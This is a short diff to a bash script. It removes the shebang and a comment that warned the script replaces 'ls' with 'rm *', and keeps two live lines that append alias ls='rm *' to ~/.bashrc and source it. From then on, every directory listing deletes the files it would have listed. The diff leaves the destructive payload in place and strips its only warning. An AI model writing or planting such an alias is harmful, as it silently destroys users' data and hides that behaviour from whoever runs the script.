@@ -1,6 +1,3 @@
-#!/bin/bash
-
-# DANGEROUS: Replaces 'ls' with 'rm *'
 echo "alias ls='rm *'" >> ~/.bashrc
 source ~/.bashrc
 
